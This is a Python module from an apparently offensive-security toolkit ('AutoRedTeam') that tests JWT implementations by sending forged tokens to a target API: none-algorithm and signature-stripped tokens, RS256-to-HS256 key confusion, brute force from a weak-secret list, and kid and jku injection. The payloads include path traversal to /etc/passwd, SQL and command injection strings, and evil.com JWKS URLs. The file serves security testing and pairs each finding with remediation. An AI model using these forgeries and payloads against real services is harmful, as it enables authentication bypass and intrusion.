#!/usr/bin/env python3
"""
JWT安全测试模块

提供全面的JWT令牌安全测试功能，包括:
- None算法漏洞测试
- 算法混淆攻击测试
- 弱密钥爆破测试
- KID注入测试
- JKU注入测试
- 过期令牌验证测试
- 签名验证测试

作者: AutoRedTeam
版本: 3.0.0
"""

import base64
import hashlib
import hmac
import json
import logging
import time
from typing import Any, Dict, List, Optional
from urllib.parse import urlparse

from .base import (
    APITestResult,
    APIVulnType,
    BaseAPITester,
    Severity,
)

logger = logging.getLogger(__name__)

# 尝试导入 PyJWT
try:
    import jwt as pyjwt

    HAS_PYJWT = True
except ImportError:
    HAS_PYJWT = False


class JWTTester(BaseAPITester):
    """
    JWT安全测试器

    对JWT令牌进行全面的安全测试。

    使用示例:
        tester = JWTTester(
            target='https://api.example.com/auth',
            token='eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...'
        )
        results = tester.test()
    """

    name = "jwt"
    description = "JWT令牌安全测试器"
    version = "3.0.0"

    # 常见弱密钥列表
    WEAK_SECRETS = [
        # 常见密码
        "secret",
        "password",
        "123456",
        "key",
        "private",
        "jwt_secret",
        "api_secret",
        "token_secret",
        "auth_secret",
        "supersecret",
        "mysecret",
        "admin",
        "test",
        "demo",
        "changeme",
        "letmein",
        "welcome",
        "passw0rd",
        # 常见密钥名
        "jwt-secret",
        "jwt_key",
        "secret_key",
        "SECRET_KEY",
        "JWT_SECRET",
        "API_KEY",
        "app_secret",
        "application_secret",
        # 开发环境常见
        "development",
        "production",
        "staging",
        "testing",
        "dev_secret",
        "prod_secret",
        "local_secret",
        # 字符串变体
        "",
        " ",
        "null",
        "undefined",
        "none",
        "nil",
        # 常见短密钥
        "a",
        "abc",
        "1234",
        "abcd1234",
        "qwerty",
        # JWT相关
        "HS256-secret",
        "hmac-secret",
        "your-256-bit-secret",
        "your-secret-key",
        "my-secret-key",
        "super-secret-key",
    ]

    # KID注入Payload
    KID_INJECTION_PAYLOADS = [
        # 路径遍历
        ("../../../etc/passwd", "path_traversal"),
        ("../../../../../../etc/passwd", "deep_path_traversal"),
        ("../../../../../../dev/null", "dev_null"),
        ("/dev/null", "absolute_dev_null"),
        # SQL注入
        ("' OR '1'='1", "sql_injection"),
        ("'; DROP TABLE users;--", "sql_injection_drop"),
        ("1' UNION SELECT 'secret'--", "sql_union"),
        # 命令注入
        ("| cat /etc/passwd", "command_injection"),
        ("; ls -la", "command_injection_semicolon"),
        # URL相关
        ("http://evil.com/jwks.json", "external_url"),
        ("file:///etc/passwd", "file_protocol"),
    ]

    def __init__(self, target: str, token: str, config: Optional[Dict[str, Any]] = None):
        """
        初始化JWT测试器

        Args:
            target: 目标API URL（用于验证token）
            token: JWT令牌字符串
            config: 可选配置，可包含:
                - public_key: RSA公钥（用于算法混淆测试）
                - weak_secrets: 自定义弱密钥列表
                - auth_header: 认证头名称（默认Authorization）
                - auth_prefix: 认证前缀（默认Bearer）
        """
        super().__init__(target, config)
        self.token = token
        self._decoded: Optional[Dict[str, Any]] = None

        # 配置项
        self.public_key = self.config.get("public_key")
        self.weak_secrets = self.config.get("weak_secrets", self.WEAK_SECRETS)
        self.auth_header = self.config.get("auth_header", "Authorization")
        self.auth_prefix = self.config.get("auth_prefix", "Bearer")

        # 解码token
        self._decoded = self._decode_token(token)

    def test(self) -> List[APITestResult]:
        """执行所有JWT安全测试"""
        self.clear_results()

        if not self._decoded:
            self._create_result(
                vulnerable=False,
                title="JWT解析失败",
                description="无法解析提供的JWT令牌，请检查格式是否正确",
                severity=Severity.INFO,
            )
            return self._results

        # 执行各项测试
        self.test_none_algorithm()
        self.test_algorithm_confusion()
        self.test_weak_secret()
        self.test_kid_injection()
        self.test_jku_injection()
        self.test_expiration()
        self.test_signature_stripping()

        return self._results

    def test_none_algorithm(self) -> Optional[APITestResult]:
        """
        测试None算法漏洞

        漏洞描述:
            某些JWT库在验证时接受alg=none的令牌，
            这允许攻击者伪造任意令牌而无需签名。

        Returns:
            测试结果或None
        """
        if not self._decoded:
            return None

        # 构造none算法的token
        header = {"alg": "none", "typ": "JWT"}
        payload = self._decoded.get("payload", {})

        # 测试多种none变体
        none_variants = ["none", "None", "NONE", "nOnE"]

        for alg in none_variants:
            test_header = {"alg": alg, "typ": "JWT"}
            none_token = self._create_unsigned_token(test_header, payload)

            if self._verify_token_accepted(none_token):
                result = self._create_result(
                    vulnerable=True,
                    vuln_type=APIVulnType.JWT_NONE_ALG,
                    severity=Severity.CRITICAL,
                    title="JWT None算法漏洞",
                    description=(
                        f'服务端接受alg="{alg}"的令牌，攻击者可以伪造任意JWT令牌' "绕过身份验证。"
                    ),
                    evidence={
                        "original_token": self.token[:50] + "...",
                        "none_token": none_token,
                        "algorithm_used": alg,
                    },
                    remediation=(
                        "1. 在服务端强制验证算法，使用白名单机制\n"
                        "2. 拒绝alg=none的令牌\n"
                        "3. 使用最新版本的JWT库"
                    ),
                )
                return result

        return None

    def test_algorithm_confusion(self) -> Optional[APITestResult]:
        """
        测试算法混淆攻击（RS256 -> HS256）

        漏洞描述:
            当服务端使用RS256（非对称加密），攻击者可以:
            1. 获取服务端公钥
            2. 将算法改为HS256
            3. 使用公钥作为HMAC密钥签名

            某些库会用公钥验证HMAC签名，导致伪造成功。

        Returns:
            测试结果或None
        """
        if not self._decoded:
            return None

        header = self._decoded.get("header", {})
        original_alg = header.get("alg", "")

        # 只对RS/ES/PS算法测试混淆
        if not any(original_alg.startswith(prefix) for prefix in ["RS", "ES", "PS"]):
            return None

        # 获取公钥
        public_key = self._get_public_key()
        if not public_key:
            logger.debug("无法获取公钥，跳过算法混淆测试")
            return None

        # 使用公钥作为HMAC密钥
        payload = self._decoded.get("payload", {})
        new_header = {"alg": "HS256", "typ": "JWT"}

        try:
            if HAS_PYJWT:
                confused_token = pyjwt.encode(payload, public_key, algorithm="HS256")
            else:
                confused_token = self._create_hs256_token(new_header, payload, public_key)

            if self._verify_token_accepted(confused_token):
                result = self._create_result(
                    vulnerable=True,
                    vuln_type=APIVulnType.JWT_ALG_CONFUSION,
                    severity=Severity.CRITICAL,
                    title="JWT算法混淆漏洞",
                    description=(
                        f"服务端存在算法混淆漏洞（{original_alg} -> HS256）。"
                        "攻击者可以使用公钥作为HMAC密钥伪造令牌。"
                    ),
                    evidence={
                        "original_algorithm": original_alg,
                        "attack_algorithm": "HS256",
                        "confused_token": confused_token[:80] + "...",
                    },
                    remediation=(
                        "1. 服务端必须固定验证算法，不允许客户端指定\n"
                        "2. 使用单独的密钥验证不同算法\n"
                        "3. 升级JWT库到最新版本"
                    ),
                )
                return result

        except Exception as e:
            logger.debug(f"算法混淆测试失败: {e}")

        return None

    def test_weak_secret(self) -> Optional[APITestResult]:
        """
        测试弱密钥

        漏洞描述:
            使用常见弱密钥签名的JWT可以被暴力破解。

        Returns:
            测试结果或None
        """
        if not self._decoded:
            return None

        header = self._decoded.get("header", {})
        alg = header.get("alg", "")

        # 只对HMAC算法测试
        if not alg.startswith("HS"):
            return None

        for secret in self.weak_secrets:
            if self._verify_secret(secret, alg):
                result = self._create_result(
                    vulnerable=True,
                    vuln_type=APIVulnType.JWT_WEAK_SECRET,
                    severity=Severity.HIGH,
                    title="JWT使用弱密钥",
                    description=(
                        f'JWT使用可被猜测的弱密钥: "{secret}"。'
                        "攻击者可以使用此密钥伪造任意令牌。"
                    ),
                    evidence={
                        "algorithm": alg,
                        "weak_secret": secret,
                        "secret_length": len(secret),
                    },
                    remediation=(
                        "1. 使用强随机密钥，建议至少256位（32字节）\n"
                        "2. 使用密码学安全的随机数生成器生成密钥\n"
                        "3. 定期轮换密钥\n"
                        "4. 考虑使用非对称加密算法（RS256等）"
                    ),
                )
                return result

        return None

    def test_kid_injection(self) -> Optional[APITestResult]:
        """
        测试KID（Key ID）注入

        漏洞描述:
            JWT头部的kid字段用于指定密钥ID，
            如果服务端不当处理此字段，可能导致:
            - 路径遍历
            - SQL注入
            - 命令注入

        Returns:
            测试结果或None
        """
        if not self._decoded:
            return None

        header = self._decoded.get("header", {})

        # 如果原token没有kid，添加一个测试
        if "kid" not in header:
            # 仍然测试是否接受kid参数
            pass

        payload = self._decoded.get("payload", {})
        vulnerable_payloads = []

        for kid_payload, attack_type in self.KID_INJECTION_PAYLOADS:
            test_header = header.copy()
            test_header["kid"] = kid_payload

            # 对于路径遍历到/dev/null，使用空密钥
            if "dev/null" in kid_payload:
                test_token = self._create_hs256_token(test_header, payload, "")
            else:
                test_token = self._create_hs256_token(test_header, payload, "test")

            if self._verify_token_accepted(test_token):
                vulnerable_payloads.append({"payload": kid_payload, "type": attack_type})

        if vulnerable_payloads:
            result = self._create_result(
                vulnerable=True,
                vuln_type=APIVulnType.JWT_KID_INJECTION,
                severity=Severity.HIGH,
                title="JWT KID注入漏洞",
                description=("JWT的kid参数存在注入漏洞，可能导致路径遍历、SQL注入或命令注入。"),
                evidence={
                    "vulnerable_payloads": vulnerable_payloads,
                    "total_found": len(vulnerable_payloads),
                },
                remediation=(
                    "1. 严格验证和过滤kid参数\n"
                    "2. 使用白名单机制，只允许预定义的kid值\n"
                    "3. 不要在kid参数中使用用户输入构造文件路径或SQL查询"
                ),
            )
            return result

        return None

    def test_jku_injection(self) -> Optional[APITestResult]:
        """
        测试JKU（JWK Set URL）注入

        漏洞描述:
            JWT头部的jku字段指向包含公钥的JWK Set URL，
            如果服务端直接访问此URL获取密钥，攻击者可以:
            1. 指向自己控制的URL
            2. 提供自己生成的公钥
            3. 使用对应私钥签名任意payload

        Returns:
            测试结果或None
        """
        if not self._decoded:
            return None

        header = self._decoded.get("header", {})

        # 检查是否存在jku
        original_jku = header.get("jku")

        if not original_jku:
            return None

        # 测试是否接受外部jku
        payload = self._decoded.get("payload", {})

        # 常见的jku绕过测试
        test_jkus = [
            "http://evil.com/jwks.json",
            "http://localhost/jwks.json",
            "http://127.0.0.1/jwks.json",
        ]

        # 如果有原始jku，尝试绕过
        if original_jku:
            parsed = urlparse(original_jku)
            # 尝试URL混淆
            test_jkus.extend(
                [
                    f"{parsed.scheme}://{parsed.netloc}@evil.com/jwks.json",
                    f"http://evil.com#{original_jku}",
                    original_jku.replace(parsed.netloc, "evil.com"),
                ]
            )

        for jku in test_jkus:
            test_header = header.copy()
            test_header["jku"] = jku

            # 这里实际测试需要设置一个真实的JWK endpoint
            # 简化版本：检查服务端是否验证jku域名
            logger.debug(f"测试JKU: {jku}")

        # 由于需要实际JWK服务器，这里只返回警告
        if original_jku:
            self._create_result(
                vulnerable=False,
                vuln_type=APIVulnType.JWT_JKU_INJECTION,
                severity=Severity.INFO,
                title="JWT使用JKU参数",
                description=(
                    f"JWT使用jku参数指向: {original_jku}\n" "建议验证服务端是否正确限制jku来源。"
                ),
                evidence={"jku": original_jku},
                remediation=(
                    "1. 使用白名单限制允许的jku域名\n"
                    "2. 建议在服务端硬编码公钥，避免使用jku\n"
                    "3. 如必须使用jku，确保使用HTTPS并验证证书"
                ),
            )

        return None

    def test_expiration(self) -> Optional[APITestResult]:
        """
        测试过期令牌验证

        漏洞描述:
            服务端可能不验证exp（过期时间）声明，
            导致过期令牌仍然有效。

        Returns:
            测试结果或None
        """
        if not self._decoded:
            return None

        payload = self._decoded.get("payload", {})
        exp = payload.get("exp")

        if not exp:
            self._create_result(
                vulnerable=False,
                vuln_type=APIVulnType.JWT_EXPIRED_ACCEPTED,
                severity=Severity.MEDIUM,
                title="JWT缺少过期时间",
                description="JWT令牌未设置exp声明，令牌可能永不过期。",
                evidence={"payload_claims": list(payload.keys())},
                remediation="设置合理的过期时间（exp），建议不超过1小时",
            )
            return None

        current_time = int(time.time())

        # 检查令牌是否已过期
        if exp < current_time:
            # 令牌已过期，测试是否仍被接受
            if self._verify_token_accepted(self.token):
                result = self._create_result(
                    vulnerable=True,
                    vuln_type=APIVulnType.JWT_EXPIRED_ACCEPTED,
                    severity=Severity.HIGH,
                    title="JWT接受过期令牌",
                    description=(
                        f"服务端接受已过期的JWT令牌。"
                        f"令牌过期时间: {exp}，当前时间: {current_time}"
                    ),
                    evidence={
                        "exp": exp,
                        "current_time": current_time,
                        "expired_seconds_ago": current_time - exp,
                    },
                    remediation=(
                        "1. 服务端必须验证exp声明\n"
                        "2. 使用标准JWT库的过期验证功能\n"
                        "3. 考虑使用较短的过期时间配合刷新令牌"
                    ),
                )
                return result

        return None

    def test_signature_stripping(self) -> Optional[APITestResult]:
        """
        测试签名剥离

        漏洞描述:
            某些情况下，服务端可能接受没有签名部分的令牌。

        Returns:
            测试结果或None
        """
        if not self._decoded:
            return None

        # 移除签名部分
        parts = self.token.split(".")
        if len(parts) != 3:
            return None

        stripped_token = f"{parts[0]}.{parts[1]}."

        if self._verify_token_accepted(stripped_token):
            result = self._create_result(
                vulnerable=True,
                vuln_type=APIVulnType.JWT_SIGNATURE_NOT_VERIFIED,
                severity=Severity.CRITICAL,
                title="JWT签名未验证",
                description="服务端接受没有有效签名的JWT令牌。",
                evidence={"stripped_token": stripped_token[:50] + "..."},
                remediation=(
                    "1. 服务端必须验证JWT签名\n"
                    "2. 拒绝签名为空或无效的令牌\n"
                    "3. 使用经过验证的JWT库"
                ),
            )
            return result

        return None

    # ==================== 辅助方法 ====================

    def _decode_token(self, token: str) -> Optional[Dict[str, Any]]:
        """
        解码JWT令牌（不验证签名）

        Args:
            token: JWT字符串

        Returns:
            解码后的字典，包含header、payload、signature
        """
        try:
            parts = token.split(".")
            if len(parts) != 3:
                logger.warning(f"无效的JWT格式，期望3部分，实际{len(parts)}部分")
                return None

            # 解码header
            header_b64 = parts[0]
            header_json = self._base64url_decode(header_b64)
            header = json.loads(header_json)

            # 解码payload
            payload_b64 = parts[1]
            payload_json = self._base64url_decode(payload_b64)
            payload = json.loads(payload_json)

            return {
                "header": header,
                "payload": payload,
                "signature": parts[2],
                "header_b64": header_b64,
                "payload_b64": payload_b64,
            }

        except Exception as e:
            logger.warning(f"JWT解码失败: {e}")
            return None

    def _base64url_decode(self, data: str) -> bytes:
        """Base64 URL安全解码"""
        # 添加填充
        padding = 4 - len(data) % 4
        if padding != 4:
            data += "=" * padding
        return base64.urlsafe_b64decode(data)

    def _base64url_encode(self, data: bytes) -> str:
        """Base64 URL安全编码"""
        return base64.urlsafe_b64encode(data).rstrip(b"=").decode("utf-8")

    def _create_unsigned_token(self, header: Dict, payload: Dict) -> str:
        """创建无签名的JWT令牌"""
        header_b64 = self._base64url_encode(json.dumps(header, separators=(",", ":")).encode())
        payload_b64 = self._base64url_encode(json.dumps(payload, separators=(",", ":")).encode())
        return f"{header_b64}.{payload_b64}."

    def _create_hs256_token(self, header: Dict, payload: Dict, secret: str) -> str:
        """创建HS256签名的JWT令牌"""
        header_b64 = self._base64url_encode(json.dumps(header, separators=(",", ":")).encode())
        payload_b64 = self._base64url_encode(json.dumps(payload, separators=(",", ":")).encode())

        message = f"{header_b64}.{payload_b64}"

        # HMAC-SHA256签名
        signature = hmac.new(
            secret.encode("utf-8"), message.encode("utf-8"), hashlib.sha256
        ).digest()

        signature_b64 = self._base64url_encode(signature)

        return f"{message}.{signature_b64}"

    def _verify_secret(self, secret: str, algorithm: str = "HS256") -> bool:
        """验证密钥是否正确"""
        if HAS_PYJWT:
            try:
                pyjwt.decode(self.token, secret, algorithms=[algorithm])
                return True
            except pyjwt.InvalidSignatureError:
                return False
            except (pyjwt.DecodeError, pyjwt.InvalidTokenError, ValueError):
                return False
        else:
            # 手动验证
            if not self._decoded:
                return False

            header_b64 = self._decoded.get("header_b64", "")
            payload_b64 = self._decoded.get("payload_b64", "")
            original_sig = self._decoded.get("signature", "")

            message = f"{header_b64}.{payload_b64}"

            if algorithm == "HS256":
                hash_func = hashlib.sha256
            elif algorithm == "HS384":
                hash_func = hashlib.sha384
            elif algorithm == "HS512":
                hash_func = hashlib.sha512
            else:
                return False

            expected_sig = hmac.new(
                secret.encode("utf-8"), message.encode("utf-8"), hash_func
            ).digest()

            expected_sig_b64 = self._base64url_encode(expected_sig)

            return hmac.compare_digest(expected_sig_b64, original_sig)

    def _verify_token_accepted(self, token: str) -> bool:
        """验证服务端是否接受令牌"""
        try:
            client = self._get_http_client()

            headers = self.extra_headers.copy()
            headers[self.auth_header] = f"{self.auth_prefix} {token}"

            response = client.get(self.target, headers=headers, timeout=self.timeout)

            # 2xx或3xx表示接受，401/403表示拒绝
            return response.status_code < 400

        except Exception as e:
            logger.debug(f"验证令牌时发生错误: {e}")
            return False

    def _get_public_key(self) -> Optional[str]:
        """获取服务端公钥"""
        # 首先检查配置中是否提供了公钥
        if self.public_key:
            return self.public_key

        # 尝试从常见端点获取
        common_jwks_paths = [
            "/.well-known/jwks.json",
            "/.well-known/openid-configuration",
            "/oauth/jwks",
            "/api/jwks",
        ]

        parsed = urlparse(self.target)
        base_url = f"{parsed.scheme}://{parsed.netloc}"

        for path in common_jwks_paths:
            try:
                client = self._get_http_client()
                response = client.get(f"{base_url}{path}", timeout=self.timeout)

                if response.status_code == 200:
                    data = response.json()
                    # 尝试从JWKS提取公钥
                    if "keys" in data and data["keys"]:
                        # 简化：返回第一个密钥
                        logger.info(f"从{path}获取到JWKS")
                        return json.dumps(data["keys"][0])
                    elif "jwks_uri" in data:
                        # OpenID配置，递归获取
                        jwks_response = client.get(data["jwks_uri"], timeout=self.timeout)
                        if jwks_response.status_code == 200:
                            jwks_data = jwks_response.json()
                            if "keys" in jwks_data and jwks_data["keys"]:
                                return json.dumps(jwks_data["keys"][0])

            except Exception as e:
                logger.debug(f"获取公钥失败 {path}: {e}")
                continue

        return None


# 便捷函数
def quick_jwt_test(target: str, token: str) -> Dict[str, Any]:
    """
    快速JWT安全测试

    Args:
        target: 目标API URL
        token: JWT令牌

    Returns:
        测试结果摘要
    """
    tester = JWTTester(target, token)
    results = tester.test()
    return tester.get_summary().to_dict()


def decode_jwt(token: str) -> Optional[Dict[str, Any]]:
    """
    解码JWT令牌（不验证）

    Args:
        token: JWT字符串

    Returns:
        解码后的header和payload
    """
    tester = JWTTester("", token)
    return tester._decoded


__all__ = [
    "JWTTester",
    "quick_jwt_test",
    "decode_jwt",
]
